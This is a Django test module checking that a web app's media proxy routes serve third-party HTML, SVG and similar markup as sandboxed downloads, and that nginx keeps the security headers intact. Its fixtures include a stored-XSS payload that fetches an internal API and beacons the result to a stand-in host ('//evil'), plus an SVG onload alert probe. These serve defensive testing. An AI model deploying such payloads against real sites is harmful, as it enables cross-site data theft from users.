"""The unauthenticated REData media proxies never hand a browser a document on the app origin (P139).

The attack: a CRIS attachment (third-party bytes) that REData labels ``text/html`` or ``image/svg+xml``.
Served verbatim, it renders as a page on this origin, where the site CSP is report-only by default and
allows inline script when enforced.
"""

from __future__ import annotations

from contextlib import ExitStack
from dataclasses import dataclass
import re
from unittest.mock import patch

from django.conf import settings
from django.core.cache import cache, caches
from django.test import Client
from django.urls import reverse

from urbanlens.core.tests.nginx_config import NGINX_DIR, parsed_directives
from urbanlens.core.tests.testcase import SimpleTestCase
from urbanlens.dashboard.services.apis.locations.google.redata_cid_gateway import RedataCidGateway
from urbanlens.dashboard.services.apis.property_records.redata_gateway import RedataGateway

_HTML = b"<html><body><script>fetch('/api/').then(r => r.text()).then(t => navigator.sendBeacon('//evil', t))</script></body></html>"
_SVG = b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>'
_PDF = b"%PDF-1.7\n1 0 obj<<>>endobj\n"
_JPEG = b"\xff\xd8\xff\xe0jpeg-bytes"

HOSTILE_TYPES = (
    "text/html",
    "text/html; charset=utf-8",
    "TEXT/HTML",
    "application/xhtml+xml",
    "image/svg+xml",
    "text/xml",
    "application/xml",
    "application/javascript",
    "text/javascript",
    "text/plain",
    "",
)


@dataclass(frozen=True)
class _Route:
    name: str
    args: tuple[object, ...]
    gateway: type
    method: str


ROUTES = (
    _Route("pin.loopnet.photo", ("listing-1", 1), RedataGateway, "download_listing_photo"),
    _Route("pin.cris.attachment", ("res-1", 5), RedataGateway, "download_cultural_resource_attachment"),
    _Route("pin.cris.extracted_image", ("res-1", 5, 7), RedataGateway, "download_extracted_image"),
    _Route("pin.place_cid.media", (123456789012345678, 1), RedataCidGateway, "download_media"),
)


def _get(route: _Route, content: bytes, content_type: str, **params: str):
    with ExitStack() as stack:
        stack.enter_context(patch.object(route.gateway, "__post_init__", lambda _self: None))
        stack.enter_context(patch.object(route.gateway, route.method, return_value=(content, content_type)))
        stack.enter_context(patch("urbanlens.dashboard.services.core.celery.safely_enqueue_task"))
        return Client().get(reverse(route.name, args=route.args), params)


class HostileUpstreamTypesAreNotRenderedTests(SimpleTestCase):
    def assert_inert_download(self, response) -> None:
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response["Content-Type"], "application/octet-stream")
        self.assertTrue(response["Content-Disposition"].startswith("attachment"), response["Content-Disposition"])
        self.assertEqual(response["X-Content-Type-Options"], "nosniff")
        policy = response["Content-Security-Policy"]
        self.assertIn("default-src 'none'", policy)
        self.assertIn("sandbox", policy)

    def test_html_and_svg_are_downloads_on_every_route(self) -> None:
        for route in ROUTES:
            for content_type in HOSTILE_TYPES:
                for body in (_HTML, _SVG):
                    with self.subTest(route=route.name, content_type=content_type, body=body[:5]):
                        caches[settings.PROXIED_BYTES_CACHE].clear()
                        self.assert_inert_download(_get(route, body, content_type))

    def test_a_hostile_type_already_in_the_cache_is_still_a_download(self) -> None:
        caches[settings.PROXIED_BYTES_CACHE].set("ul_cris_attachment_res-1_5", (_HTML, "text/html"))
        response = Client().get(reverse("pin.cris.attachment", args=["res-1", 5]))
        self.assert_inert_download(response)

    def test_preview_of_an_svg_does_not_serve_the_svg(self) -> None:
        """``is_web_safe`` counts SVG as displayable, which is true of an ``<img>`` and not of a navigation."""
        response = _get(ROUTES[1], _SVG, "image/svg+xml", preview="1")
        self.assertNotEqual(response.get("Content-Type"), "image/svg+xml")
        self.assertNotIn(b"<svg", response.content)

    def test_a_pdf_label_on_markup_is_a_download(self) -> None:
        self.assert_inert_download(_get(ROUTES[1], _HTML, "application/pdf"))


class AllowListedTypesStillDisplayTests(SimpleTestCase):
    def test_an_image_is_inline_and_sandboxed(self) -> None:
        response = _get(ROUTES[0], _JPEG, "image/jpeg")
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response["Content-Type"], "image/jpeg")
        self.assertNotIn("Content-Disposition", response)
        self.assertEqual(response["X-Content-Type-Options"], "nosniff")
        self.assertIn("default-src 'none'", response["Content-Security-Policy"])
        self.assertIn("sandbox", response["Content-Security-Policy"])

    def test_a_video_is_inline(self) -> None:
        response = _get(ROUTES[3], b"\x00\x00\x00\x18ftypmp42", "video/mp4")
        self.assertEqual(response["Content-Type"], "video/mp4")
        self.assertNotIn("Content-Disposition", response)

    def test_a_real_pdf_is_inline_and_frameable_by_the_lightbox(self) -> None:
        """No ``sandbox`` on a PDF: Chrome refuses to run its viewer in a sandboxed document."""
        response = _get(ROUTES[1], _PDF, "application/pdf")
        self.assertEqual(response["Content-Type"], "application/pdf")
        self.assertFalse(response.get("Content-Disposition", "inline").startswith("attachment"))
        policy = response["Content-Security-Policy"]
        self.assertIn("default-src 'none'", policy)
        self.assertIn("frame-ancestors 'self'", policy)
        self.assertNotIn("sandbox", policy)
        self.assertEqual(response["X-Frame-Options"], "SAMEORIGIN")
        self.assertEqual(response["X-Content-Type-Options"], "nosniff")

    def test_a_rendered_preview_carries_the_same_headers(self) -> None:
        cache.set("ul_cris_attachment_res-1_5_preview", (_JPEG, "image/jpeg"))
        response = Client().get(reverse("pin.cris.attachment", args=["res-1", 5]), {"preview": "1"})
        self.assertEqual(response["Content-Type"], "image/jpeg")
        self.assertIn("default-src 'none'", response["Content-Security-Policy"])
        self.assertEqual(response["X-Content-Type-Options"], "nosniff")


def _location_for(path: str, text: str) -> tuple[str, ...]:
    """The location block nginx picks for *path*: exact, then longest prefix unless a regex matches."""
    locations = [tokens[1:] for _, tokens, _ in parsed_directives(text) if tokens[0] == "location"]
    for spec in locations:
        if spec[0] == "=" and spec[1] == path:
            return tuple(spec)
    prefixes = [spec for spec in locations if len(spec) == 1 and path.startswith(spec[0])]
    best = max(prefixes, key=lambda spec: len(spec[0]), default=None)
    for spec in locations:
        if spec[0] in ("~", "~*") and re.search(spec[1], path, re.IGNORECASE if spec[0] == "~*" else 0):
            return tuple(spec)
    assert best is not None
    return tuple(best)


class NginxDeliversTheHeadersTests(SimpleTestCase):
    """These are Django responses proxied by ``location /``, not X-Accel handoffs, so nothing should strip them."""

    PROTECTED = frozenset(
        {"content-security-policy", "x-content-type-options", "content-disposition", "content-type", "x-frame-options"}
    )

    def test_the_proxy_routes_reach_the_plain_proxy_location(self) -> None:
        text = (NGINX_DIR / "django.conf.template").read_text()
        for route in ROUTES:
            with self.subTest(route=route.name):
                self.assertEqual(_location_for(reverse(route.name, args=route.args), text), ("/",))

    def test_nothing_on_the_way_hides_the_hardening_headers(self) -> None:
        for name in ("django.conf.template", "nginx.conf"):
            text = (NGINX_DIR / name).read_text()
            for context, tokens, line in parsed_directives(text):
                applies = all(frame[0] != "location" or frame == ("location", "/") for frame in context)
                if not applies or tokens[0] not in ("proxy_hide_header", "proxy_ignore_headers"):
                    continue
                with self.subTest(file=name, line=line):
                    self.assertNotIn(tokens[1].lower(), self.PROTECTED)
